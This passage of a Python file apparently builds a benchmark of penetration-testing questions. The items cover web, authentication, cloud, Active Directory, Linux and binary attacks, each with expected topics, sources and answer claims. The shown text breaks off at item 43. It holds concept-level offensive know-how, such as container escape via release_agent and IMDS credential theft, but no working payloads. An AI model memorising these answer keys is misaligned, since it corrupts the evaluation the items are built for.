"""100 Curated VAPT Query Bank Generator & Validator (Milestone M9).

Delivers data/knowledge/vapt_query_bank.json covering:
- Reconnaissance, Web Security, Authentication, Authorization, API Security,
  Mobile, Network, Cloud, Windows/AD, Linux, Binary/RE, SOC/DFIR, Secure Coding.
- Categories: Conceptual, Methodological, Comparison, CVE Analysis, CWE Mapping,
  Attack-Chain Reasoning, Defensive Mitigation, Lab Reproduction, Code Analysis,
  Protocol Analysis, Mobile Security, API Security, Binary Security.
"""

import json
from pathlib import Path
from typing import Any, Dict, List
from pydantic import BaseModel, Field


class VaptQueryItem(BaseModel):
    query_id: str
    question: str
    domain: str
    subdomain: str
    difficulty: str  # "BEGINNER", "INTERMEDIATE", "ADVANCED"
    expected_topics: List[str]
    expected_answer_characteristics: List[str] = Field(default_factory=list)
    citation_required: bool = True
    expected_source_classes: List[str] = Field(default_factory=list)
    requires_deep_reasoning: bool = False
    expected_epistemic_status: str = "GENERAL_VAPT_KNOWLEDGE"
    category: str = "conceptual"
    expected_sources: List[str] = Field(default_factory=list)
    expected_claims: List[str] = Field(default_factory=list)
    expected_epistemic_type: str = "GENERAL_VAPT_KNOWLEDGE"
    requires_external_research: bool = False


# Raw curated dataset of 100 comprehensive VAPT queries
CURATED_100_QUERIES: List[Dict[str, Any]] = [
    # --- WEB SECURITY: SSRF, XSS, SQLi, CSRF, Smuggling, Traversal, Deserialization, etc. ---
    {
        "query_id": "VAPT-QB-001",
        "domain": "WEB_SECURITY",
        "subdomain": "SSRF",
        "category": "conceptual",
        "question": "What is Server-Side Request Forgery (SSRF) and how does blind SSRF differ from in-band SSRF?",
        "expected_topics": ["SSRF", "Blind SSRF", "In-band SSRF", "Internal Network Access", "Metadata Endpoints"],
        "expected_sources": ["OWASP", "CWE-918", "PortSwigger Web Security Academy"],
        "expected_claims": ["SSRF induces server to make requests to unauthorized destinations", "In-band returns response payload to client", "Blind relies on out-of-band network interactions"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-002",
        "domain": "WEB_SECURITY",
        "subdomain": "SSRF_VS_CSRF",
        "category": "comparison",
        "question": "Compare Server-Side Request Forgery (SSRF) and Cross-Site Request Forgery (CSRF). Where do the requests originate and what are the trust boundaries?",
        "expected_topics": ["SSRF", "CSRF", "Originating context", "Trust boundaries", "Client vs Server execution"],
        "expected_sources": ["OWASP", "CWE-918", "CWE-352"],
        "expected_claims": ["CSRF forces victim browser to issue authenticated requests", "SSRF forces backend server to issue requests behind firewall", "CSRF targets user session trust while SSRF targets server network trust"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-003",
        "domain": "WEB_SECURITY",
        "subdomain": "HTTP_REQUEST_SMUGGLING",
        "category": "protocol_analysis",
        "question": "How does HTTP Request Smuggling (CL.TE vs TE.CL) operate when front-end proxies and back-end servers disagree on message boundaries?",
        "expected_topics": ["HTTP Request Smuggling", "Content-Length", "Transfer-Encoding", "Front-end Proxy", "RFC 7230"],
        "expected_sources": ["RFC 7230", "PortSwigger", "CWE-444"],
        "expected_claims": ["CL.TE front-end uses Content-Length while back-end uses Transfer-Encoding", "Ambiguity causes back-end to treat remaining bytes as the start of next request", "RFC 7230 mandates rejecting or prioritizing chunked over Content-Length"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-004",
        "domain": "WEB_SECURITY",
        "subdomain": "SQLI",
        "category": "methodological",
        "question": "What is the systematic methodology for validating Time-Based Blind SQL Injection using database sleep primitives without corrupting data?",
        "expected_topics": ["Time-Based Blind SQLi", "Sleep Primitives", "pg_sleep", "WAITFOR DELAY", "Negative Controls"],
        "expected_sources": ["OWASP WSTG-INPV-05", "CWE-89"],
        "expected_claims": ["Use deterministic delay functions to confirm boolean evaluations", "Benchmark baseline response latency prior to injection", "Verify negative control conditions do not trigger delays"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-005",
        "domain": "WEB_SECURITY",
        "subdomain": "XSS",
        "category": "comparison",
        "question": "Compare Reflected, Stored, and DOM-based Cross-Site Scripting (XSS) in terms of persistence and source-to-sink execution paths.",
        "expected_topics": ["Reflected XSS", "Stored XSS", "DOM XSS", "Execution sink", "Taint flow"],
        "expected_sources": ["OWASP WSTG-INPV-01", "CWE-79"],
        "expected_claims": ["Reflected executes immediately in response to user payload", "Stored persists payload in storage backend for future viewers", "DOM XSS occurs entirely within browser document modification without server reflection"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-006",
        "domain": "WEB_SECURITY",
        "subdomain": "SSTI",
        "category": "conceptual",
        "question": "Explain Server-Side Template Injection (SSTI) in Jinja2 and how attackers traverse Python MRO to reach subprocess execution.",
        "expected_topics": ["SSTI", "Jinja2", "Python MRO", "__subclasses__", "os.popen", "subprocess"],
        "expected_sources": ["OWASP", "CWE-1336"],
        "expected_claims": ["Template engine evaluates user input as template code", "Accessing object subclasses via MRO allows locating os or subprocess modules", "Sandboxes often circumvented via attribute reflection"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-007",
        "domain": "WEB_SECURITY",
        "subdomain": "XXE",
        "category": "defensive_mitigation",
        "question": "How does XML External Entity (XXE) injection lead to local file disclosure and what parser configuration flags remediate it in Java XML parsers?",
        "expected_topics": ["XXE", "DOCTYPE", "SYSTEM entity", "DocumentBuilderFactory", "disallow-doctype-decl"],
        "expected_sources": ["OWASP XXE Prevention Cheat Sheet", "CWE-611"],
        "expected_claims": ["External general entities read URI resources like file://", "Remediate by setting FEATURE_SECURE_PROCESSING and disallowing DOCTYPE declarations"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-008",
        "domain": "WEB_SECURITY",
        "subdomain": "DESERIALIZATION",
        "category": "conceptual",
        "question": "Explain the mechanics of Insecure Deserialization in Java and how gadget chains like Apache Commons Collections execute arbitrary code.",
        "expected_topics": ["Insecure Deserialization", "Java readObject", "Gadget Chains", "Commons Collections", "InvokerTransformer"],
        "expected_sources": ["OWASP WSTG-INPV-15", "CWE-502"],
        "expected_claims": ["readObject deserializes serialized object state triggering dynamic method dispatch", "Gadget chains chain legitimate classes to achieve dangerous reflection or process invocation"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-009",
        "domain": "WEB_SECURITY",
        "subdomain": "PROTOTYPE_POLLUTION",
        "category": "code_analysis",
        "question": "How does Object Prototype Pollution occur in JavaScript during recursive object merges and how can it lead to Remote Code Execution?",
        "expected_topics": ["Prototype Pollution", "__proto__", "constructor.prototype", "recursive merge", "Node.js child_process"],
        "expected_sources": ["CWE-1321", "PortSwigger Research"],
        "expected_claims": ["Unsanitized property assignment to __proto__ modifies Object.prototype for all objects", "Polluting env, shell, or argv properties triggers RCE when child processes spawn"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-010",
        "domain": "WEB_SECURITY",
        "subdomain": "PATH_TRAVERSAL",
        "category": "conceptual",
        "question": "Explain directory path traversal, path normalization bypasses (e.g., URL-encoding, null-byte, dot-dot-slash variations), and proper path validation.",
        "expected_topics": ["Path Traversal", "Canonicalization", "URL-encoding", "..;/", "realpath"],
        "expected_sources": ["OWASP WSTG-ATHZ-01", "CWE-22"],
        "expected_claims": ["Traversing directory delimiters escapes intended web root directory", "Validating normalized absolute path against authorized root prevents traversal"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-011",
        "domain": "WEB_SECURITY",
        "subdomain": "FILE_UPLOAD",
        "category": "methodological",
        "question": "What is the comprehensive testing methodology for validating unrestricted file upload vulnerabilities?",
        "expected_topics": ["File Upload", "MIME type validation", "Extension blacklist bypass", "Double extension", "Polyglot files", "Content-Disposition"],
        "expected_sources": ["OWASP WSTG-BUSL-08", "CWE-434"],
        "expected_claims": ["Test client-side vs server-side extension and MIME validation", "Examine execution permissions in storage directory", "Verify content inspection and file renaming"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-012",
        "domain": "WEB_SECURITY",
        "subdomain": "RACE_CONDITIONS",
        "category": "methodological",
        "question": "How do Limit-Overrun Race Conditions operate in financial/e-commerce endpoints and how do HTTP/2 single-packet techniques assist testing?",
        "expected_topics": ["Race Conditions", "Limit-Overrun", "TOCTOU", "HTTP/2 Single Packet Attack", "Database Locking"],
        "expected_sources": ["PortSwigger Smashing the State Machine", "CWE-362"],
        "expected_claims": ["Simultaneous requests enter validation window before state write occurs", "HTTP/2 multiplexing allows sending requests in single TCP packet to minimize network jitter"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },

    # --- AUTHENTICATION & SESSION MANAGEMENT ---
    {
        "query_id": "VAPT-QB-013",
        "domain": "AUTHENTICATION",
        "subdomain": "JWT",
        "category": "conceptual",
        "question": "Explain JSON Web Token (JWT) architecture and key security weaknesses including 'none' algorithm and HMAC/RSA key confusion.",
        "expected_topics": ["JWT", "RFC 7519", "alg: none", "Key Confusion Attack", "kid injection", "Signature Verification"],
        "expected_sources": ["RFC 7519", "RFC 8725", "OWASP JWT Cheat Sheet", "CWE-347"],
        "expected_claims": ["JWT consists of Base64URL header, payload, and signature", "Algorithm none allows skipping signature verification", "Key confusion treats RSA public key as HMAC secret key"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-014",
        "domain": "AUTHENTICATION",
        "subdomain": "OAUTH2",
        "category": "protocol_analysis",
        "question": "How does the OAuth 2.0 Authorization Code Flow with PKCE function, and what vulnerability does PKCE mitigate compared to standard code flow?",
        "expected_topics": ["OAuth 2.0", "PKCE", "code_verifier", "code_challenge", "Authorization Code Interception", "RFC 7636"],
        "expected_sources": ["RFC 6749", "RFC 7636", "OWASP OAuth 2.0 Cheat Sheet"],
        "expected_claims": ["PKCE binds authorization code to initial client request via cryptographic verifier", "Mitigates authorization code interception attacks on public clients without client secret"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-015",
        "domain": "AUTHENTICATION",
        "subdomain": "SAML",
        "category": "protocol_analysis",
        "question": "Explain SAML 2.0 XML Signature Wrapping (XSW) attacks and how signature verification can be decoupled from asserted identity.",
        "expected_topics": ["SAML 2.0", "XML Signature Wrapping", "XSW", "Assertion", "DigestValue", "ID reference"],
        "expected_sources": ["OWASP SAML Security Cheat Sheet", "CWE-347"],
        "expected_claims": ["SAML signature verifies digest of referenced XML element ID", "XSW moves original signed element while parser reads malicious cloned assertion without valid signature check"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-016",
        "domain": "AUTHENTICATION",
        "subdomain": "SESSION_MANAGEMENT",
        "category": "conceptual",
        "question": "What is Session Fixation and how does renewing session identifiers upon privilege transition mitigate it?",
        "expected_topics": ["Session Fixation", "Session ID Regeneration", "Set-Cookie", "Cookie Flags"],
        "expected_sources": ["OWASP WSTG-SESS-03", "CWE-384"],
        "expected_claims": ["Attacker pre-sets session ID for victim before authentication", "Regenerating session ID upon login invalidates pre-authentication identifier"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-017",
        "domain": "AUTHENTICATION",
        "subdomain": "MFA_BYPASS",
        "category": "methodological",
        "question": "What are common test scenarios for multi-factor authentication (MFA) bypass in web applications?",
        "expected_topics": ["MFA Bypass", "Forced Browsing", "Response Manipulation", "Token Brute Force", "Session Reuse", "OAuth fallback"],
        "expected_sources": ["OWASP WSTG-ATHN-05", "CWE-308"],
        "expected_claims": ["Verify endpoint access without completing MFA step", "Test brute force resistance on OTP tokens", "Check whether password reset flows drop MFA requirements"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-018",
        "domain": "AUTHENTICATION",
        "subdomain": "AUTH_VS_AUTHZ",
        "category": "comparison",
        "question": "What is the fundamental difference between Authentication and Authorization in system security architecture?",
        "expected_topics": ["Authentication (401)", "Authorization (403)", "Identity proof", "Access control policy", "Subject permissions"],
        "expected_sources": ["NIST SP 800-63", "OWASP ASVS V2 & V4"],
        "expected_claims": ["Authentication verifies who the user is (identity)", "Authorization determines what an authenticated subject is permitted to do"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },

    # --- AUTHORIZATION: IDOR, BOLA, BFLA, PRIVILEGE ESCALATION ---
    {
        "query_id": "VAPT-QB-019",
        "domain": "AUTHORIZATION",
        "subdomain": "IDOR_VS_BOLA",
        "category": "comparison",
        "question": "Explain the difference and historical lineage between Insecure Direct Object References (IDOR) and Broken Object Level Authorization (BOLA).",
        "expected_topics": ["IDOR", "BOLA", "OWASP Top 10 2007 A4", "OWASP API Security Top 10 API1:2023", "Object Identifier Access"],
        "expected_sources": ["OWASP Top 10", "OWASP API Security Top 10", "CWE-639"],
        "expected_claims": ["IDOR coined in OWASP Top 10 2007 referring to direct references without access control", "BOLA is modern API reformulation emphasizing object-level permission enforcement in microservices"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-020",
        "domain": "AUTHORIZATION",
        "subdomain": "BFLA",
        "category": "conceptual",
        "question": "What is Broken Function Level Authorization (BFLA) and how does it differ from BOLA in modern REST architectures?",
        "expected_topics": ["BFLA", "BOLA", "Administrative Endpoints", "HTTP Verb Tampering", "Role Hierarchies"],
        "expected_sources": ["OWASP API Security API5:2023", "CWE-285"],
        "expected_claims": ["BOLA involves accessing another user's object at same privilege level", "BFLA involves regular user invoking privileged administrative functions or methods"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-021",
        "domain": "AUTHORIZATION",
        "subdomain": "TENANT_ISOLATION",
        "category": "methodological",
        "question": "How should a penetration tester systematically evaluate multi-tenant data isolation bypasses in SaaS environments?",
        "expected_topics": ["Multi-tenancy", "Tenant Isolation", "Cross-tenant access", "Tenant ID parameter", "Row-level security"],
        "expected_sources": ["OWASP ASVS V4.1", "CWE-284"],
        "expected_claims": ["Provision two distinct tenant accounts Tenant A and Tenant B", "Attempt cross-tenant object mutation and read requests", "Evaluate background job and asynchronous queue tenant segregation"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-022",
        "domain": "AUTHORIZATION",
        "subdomain": "PRIVILEGE_ESCALATION",
        "category": "comparison",
        "question": "Compare horizontal and vertical privilege escalation with concrete examples in web applications.",
        "expected_topics": ["Horizontal Privilege Escalation", "Vertical Privilege Escalation", "Peer user access", "Administrator escalation"],
        "expected_sources": ["OWASP WSTG-ATHZ-02", "OWASP WSTG-ATHZ-03", "CWE-269"],
        "expected_claims": ["Horizontal access grants unauthorized resources belonging to user with identical privilege tier", "Vertical access escalates lower-tier user into higher privilege administrative tier"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },

    # --- API SECURITY: REST, GRAPHQL, MASS ASSIGNMENT, RATE LIMITING ---
    {
        "query_id": "VAPT-QB-023",
        "domain": "API_SECURITY",
        "subdomain": "MASS_ASSIGNMENT",
        "category": "code_analysis",
        "question": "Explain Mass Assignment (Auto-binding) vulnerabilities in modern web frameworks (Spring, Rails, Express) and how to prevent them with DTOs.",
        "expected_topics": ["Mass Assignment", "Auto-binding", "Over-posting", "Data Transfer Objects (DTO)", "Allowlist binding"],
        "expected_sources": ["OWASP API Security API6:2023", "CWE-915"],
        "expected_claims": ["Framework binds request JSON directly to database entity model", "Attackers inject unauthorized properties like isAdmin: true", "Prevent using explicit Data Transfer Objects with strict property mapping"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-024",
        "domain": "API_SECURITY",
        "subdomain": "GRAPHQL",
        "category": "methodological",
        "question": "What are common security risks in GraphQL APIs including introspection, query depth exhaustion, and batching attacks?",
        "expected_topics": ["GraphQL", "Schema Introspection", "Query Depth Limits", "Circular Queries", "Batching Abuse"],
        "expected_sources": ["OWASP GraphQL Cheat Sheet", "CWE-400"],
        "expected_claims": ["Introspection exposes private schema and documentation", "Unrestricted nested queries lead to DoS via CPU/memory exhaustion", "Batching allows bypassing rate limits on authentication mutations"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-025",
        "domain": "API_SECURITY",
        "subdomain": "RATE_LIMITING",
        "category": "conceptual",
        "question": "How do distributed API rate limiting bypasses occur through IP spoofing headers (X-Forwarded-For, Client-IP) and header manipulation?",
        "expected_topics": ["Rate Limiting", "X-Forwarded-For", "True-Client-IP", "Reverse Proxy Trust", "Rate limit bypass"],
        "expected_sources": ["OWASP API Security API4:2023", "CWE-770"],
        "expected_claims": ["Rate limiter trusting unvalidated client IP header allows rotating fake IP values", "Reverse proxies must strip or overwrite untrusted upstream proxy headers"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },

    # --- MOBILE SECURITY: ANDROID, IOS, REVERSING, SMALI, INTENTS ---
    {
        "query_id": "VAPT-QB-026",
        "domain": "MOBILE",
        "subdomain": "ANDROID_EXPORTED_COMPONENTS",
        "category": "conceptual",
        "question": "How does Android exported component abuse work when activities, services, or broadcast receivers set android:exported='true'?",
        "expected_topics": ["Android", "android:exported", "Activity", "BroadcastReceiver", "Service", "IPC", "Intent Filter"],
        "expected_sources": ["Android Security Documentation", "OWASP MASTG-TEST-0001", "CWE-926"],
        "expected_claims": ["Exported components are accessible to any third-party app on the device", "Omitting permission checks allows rogue apps to invoke sensitive flows or steal data"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-027",
        "domain": "MOBILE",
        "subdomain": "ANDROID_DEEP_LINKS",
        "category": "attack_chain_reasoning",
        "question": "Explain how unvalidated Android Deep Links and App Links can lead to arbitrary Account Takeover or sensitive data theft.",
        "expected_topics": ["Deep Links", "App Links", "intent-filter", "scheme", "host", "WebView token leak"],
        "expected_sources": ["OWASP MASTG", "Android App Links Documentation"],
        "expected_claims": ["Custom URL schemes without App Link assetlinks.json verification can be claimed by malicious apps", "Parameters passed into exported handlers without sanitization enable CSRF or token theft"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-028",
        "domain": "MOBILE",
        "subdomain": "CERTIFICATE_PINNING",
        "category": "defensive_mitigation",
        "question": "What is SSL/TLS Certificate Pinning in mobile apps, and what are standard dynamic hooking techniques used to bypass it during security testing?",
        "expected_topics": ["Certificate Pinning", "TrustManager", "Frida", "Dynamic Hooking", "Network Security Config"],
        "expected_sources": ["OWASP MASTG-NETWORK-4", "Android Network Security Config"],
        "expected_claims": ["Pinning validates server certificate against hardcoded public key hash", "Frida hooks TrustManager or SSL_CTX to force positive validation during testing"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-029",
        "domain": "MOBILE",
        "subdomain": "ANDROID_WEBVIEW",
        "category": "code_analysis",
        "question": "Explain the security risks of enabling setJavaScriptEnabled(true) and addJavascriptInterface in Android WebViews targeting legacy API levels.",
        "expected_topics": ["Android WebView", "addJavascriptInterface", "setJavaScriptEnabled", "@JavascriptInterface", "Reflection RCE"],
        "expected_sources": ["Android Developers Reference", "CWE-749", "OWASP MASTG"],
        "expected_claims": ["addJavascriptInterface exposes Java objects to JavaScript execution context", "Prior to Android 4.2 (API 17), lack of @JavascriptInterface allowed arbitrary reflection RCE"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-030",
        "domain": "MOBILE",
        "subdomain": "APK_STRUCTURE",
        "category": "conceptual",
        "question": "Describe the internal structure of an Android APK file and explain the role of AndroidManifest.xml, classes.dex, and resources.arsc.",
        "expected_topics": ["APK Structure", "AndroidManifest.xml", "classes.dex", "resources.arsc", "META-INF", "Dalvik bytecode"],
        "expected_sources": ["Android Developer Guides", "OWASP MASTG-STORAGE-1"],
        "expected_claims": ["APK is a ZIP archive containing compiled DEX bytecode, manifest, and binary XML resources", "AndroidManifest.xml declares package permissions, components, and hardware requirements"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },

    # --- NETWORK SECURITY: DNS REBINDING, TLS, ROUTING, PROXIES ---
    {
        "query_id": "VAPT-QB-031",
        "domain": "NETWORK",
        "subdomain": "DNS_REBINDING",
        "category": "protocol_analysis",
        "question": "How does a DNS Rebinding attack bypass Same-Origin Policy (SOP) to interact with internal private network services?",
        "expected_topics": ["DNS Rebinding", "Same-Origin Policy", "DNS TTL", "127.0.0.1", "Private IP ranges", "Host Header validation"],
        "expected_sources": ["OWASP DNS Rebinding", "CWE-350"],
        "expected_claims": ["Attacker server provides short TTL (0s) resolving first to external IP, then rebinds to 127.0.0.1", "Browser retains origin name allowing subsequent requests to target local service", "Mitigated by strict HTTP Host header validation on local services"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-032",
        "domain": "NETWORK",
        "subdomain": "TLS_HANDSHAKE",
        "category": "protocol_analysis",
        "question": "Explain the cryptographic stages of the TLS 1.3 handshake and contrast it with TLS 1.2 in terms of latency and cipher suite negotiation.",
        "expected_topics": ["TLS 1.3", "TLS 1.2", "ClientHello", "Key Share", "0-RTT", "Forward Secrecy", "Ephemeral Diffie-Hellman"],
        "expected_sources": ["RFC 8446", "NIST SP 800-52"],
        "expected_claims": ["TLS 1.3 reduces handshake latency to 1-RTT by combining key share in ClientHello", "Removes legacy static RSA key exchange and weak CBC ciphers, mandating ephemeral Diffie-Hellman"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-033",
        "domain": "NETWORK",
        "subdomain": "TCP_SYN_FLOOD",
        "category": "conceptual",
        "question": "Explain how TCP SYN flood attacks exploit TCP half-open connection queues and how SYN Cookies mitigate the vulnerability.",
        "expected_topics": ["TCP SYN Flood", "Three-way handshake", "SYN queue", "SYN Cookies", "RFC 4987"],
        "expected_sources": ["RFC 4987", "CWE-400"],
        "expected_claims": ["Attacker floods SYN packets without sending final ACK, filling connection backlog", "SYN Cookies encode connection state cryptographically in sequence number without allocating memory"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },

    # --- CLOUD SECURITY: AWS IAM, METADATA, KUBERNETES, CONTAINERS ---
    {
        "query_id": "VAPT-QB-034",
        "domain": "CLOUD",
        "subdomain": "IMDS_SSRF",
        "category": "attack_chain_reasoning",
        "question": "How do SSRF attacks against AWS EC2 Instance Metadata Service (IMDSv1 vs IMDSv2) enable IAM credential theft, and how does IMDSv2 mitigate it?",
        "expected_topics": ["AWS IMDS", "169.254.169.254", "IMDSv1", "IMDSv2", "Session Token", "X-aws-ec2-metadata-token", "SSRF"],
        "expected_sources": ["AWS Documentation", "OWASP SSRF Cheat Sheet"],
        "expected_claims": ["IMDSv1 allows simple GET requests to retrieve IAM role security credentials", "IMDSv2 requires PUT request with X-aws-ec2-metadata-token-ttl-seconds header to fetch session token", "Standard web SSRF cannot issue custom PUT header, blocking token retrieval"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-035",
        "domain": "CLOUD",
        "subdomain": "KUBERNETES_RBAC",
        "category": "conceptual",
        "question": "What are common misconfigurations in Kubernetes Role-Based Access Control (RBAC) that lead to cluster privilege escalation?",
        "expected_topics": ["Kubernetes RBAC", "ClusterRole", "ClusterRoleBinding", "ServiceAccount", "pods/exec", "secrets"],
        "expected_sources": ["Kubernetes Documentation", "CIS Kubernetes Benchmark"],
        "expected_claims": ["Granting pods/exec or create pods permissions allows running container with hostPath mount to node root filesystem", "Service accounts with get/list secrets permissions can steal cluster-admin tokens"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-036",
        "domain": "CLOUD",
        "subdomain": "CONTAINER_ESCAPE",
        "category": "conceptual",
        "question": "How does a container escape vulnerability function when a container is run with --privileged or CAP_SYS_ADMIN capabilities?",
        "expected_topics": ["Container Escape", "--privileged", "cgroups", "release_agent", "CAP_SYS_ADMIN", "Docker escape"],
        "expected_sources": ["Docker Security Documentation", "Linux Capabilities man-pages"],
        "expected_claims": ["Running with --privileged disables AppArmor/Seccomp and grants all Linux capabilities", "Attacker mounts cgroup controller and configures release_agent script to execute on host as root"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },

    # --- WINDOWS / ACTIVE DIRECTORY: KERBEROS, NTLM, LDAP, PRIVILEGE BOUNDARIES ---
    {
        "query_id": "VAPT-QB-037",
        "domain": "WINDOWS_AD",
        "subdomain": "KERBEROS_AUTHENTICATION",
        "category": "protocol_analysis",
        "question": "How does Kerberos authentication work in Active Directory (AS-REQ, AS-REP, TGS-REQ, TGS-REP, AP-REQ) and what is a TGT?",
        "expected_topics": ["Kerberos", "Active Directory", "KDC", "AS-REQ", "AS-REP", "TGT", "TGS-REQ", "TGS-REP", "Ticket Granting Ticket"],
        "expected_sources": ["RFC 4120", "Microsoft MS-KILE Documentation"],
        "expected_claims": ["Client sends AS-REQ with timestamp encrypted with user secret to KDC", "KDC returns AS-REP with TGT encrypted with krbtgt key", "Client presents TGT in TGS-REQ to request service tickets"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-038",
        "domain": "WINDOWS_AD",
        "subdomain": "KERBEROASTING",
        "category": "methodological",
        "question": "Explain the Kerberoasting attack technique. Why does any authenticated domain user have the ability to request service tickets for SPNs?",
        "expected_topics": ["Kerberoasting", "SPN", "Service Principal Name", "TGS-REP", "RC4", "Offline Cracking", "Active Directory"],
        "expected_sources": ["MITRE ATT&CK T1558.003", "Microsoft Security Advisories"],
        "expected_claims": ["Any domain user can request a TGS ticket for accounts registered with an SPN", "The ticket payload is encrypted with the service account password hash, allowing offline cracking"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-039",
        "domain": "WINDOWS_AD",
        "subdomain": "NTLM_RELAY",
        "category": "attack_chain_reasoning",
        "question": "How does an NTLM Relay attack operate and what defenses (SMB Signing, EPA, LDAP Channel Binding) prevent relaying to administrative services?",
        "expected_topics": ["NTLM Relay", "SMB Signing", "Extended Protection for Authentication (EPA)", "LDAP Channel Binding", "Coerce Authentication"],
        "expected_sources": ["Microsoft Security Documentation", "MITRE ATT&CK T1557.001"],
        "expected_claims": ["Attacker coerces NTLM authentication and relays challenge-response tokens to target service", "SMB Signing and LDAP Channel Binding bind connection state cryptographically, breaking unauthenticated relay"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-040",
        "domain": "WINDOWS_AD",
        "subdomain": "ASREPROASTING",
        "category": "conceptual",
        "question": "What is AS-REP Roasting and what Active Directory account setting exposes user hashes to pre-authentication attacks?",
        "expected_topics": ["AS-REP Roasting", "DONT_REQ_PREAUTH", "Kerberos Pre-authentication", "AS-REP", "Offline Hash Cracking"],
        "expected_sources": ["MITRE ATT&CK T1558.004", "Microsoft AD Documentation"],
        "expected_claims": ["Accounts with DONT_REQ_PREAUTH flag return AS-REP without prior authentication", "The returned encrypted timestamp can be cracked offline without generating logon failure events"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },

    # --- LINUX SECURITY: PERMISSIONS, CAPABILITIES, PROCESS ISOLATION ---
    {
        "query_id": "VAPT-QB-041",
        "domain": "LINUX",
        "subdomain": "LINUX_CAPABILITIES",
        "category": "conceptual",
        "question": "Explain Linux Capabilities (e.g. CAP_SETUID, CAP_NET_RAW, CAP_SYS_PTRACE) and how they partition traditional root privileges.",
        "expected_topics": ["Linux Capabilities", "CAP_SETUID", "CAP_SYS_ADMIN", "capabilities(7)", "Privilege Separation"],
        "expected_sources": ["Linux man-pages capabilities(7)", "CWE-250"],
        "expected_claims": ["Capabilities divide monolithic root user authority into distinct independent privileges", "Binaries with setcap can execute sensitive operations without full SUID root access"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-042",
        "domain": "LINUX",
        "subdomain": "SUID_BINARIES",
        "category": "methodological",
        "question": "How do misconfigured SUID binaries or GTFOBins enable local privilege escalation on Linux hosts?",
        "expected_topics": ["SUID", "GTFOBins", "chmod u+s", "Local Privilege Escalation", "PATH hijacking"],
        "expected_sources": ["CWE-732", "GTFOBins Repository"],
        "expected_claims": ["SUID files execute with the file owner's privileges regardless of calling user", "If an SUID binary executes interactive shells or unquoted relative PATH commands, root escalation occurs"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },

    # --- BINARY / REVERSE ENGINEERING: MEMORY CORRUPTION, ELF/PE, MITIGATIONS ---
    {
        "query_id": "VAPT-QB-043",
        "domain": "BINARY_RE",
        "subdomain": "BUFFER_OVERFLOW",
        "category": "conceptual",
        "question": "What is a classic Stack-Based Buffer Overflow, how does it overwrite the saved instruction pointer (RIP/EIP), and how does stack canary mitigate it?",
        "expected_topics": ["Stack Buffer Overflow", "Saved EIP/RIP", "Stack Canary", "Stack frame", "strcpy"],
        "expected_sources": ["CWE-121", "Phrack 49: Smashing The Stack For Fun And Profit"],
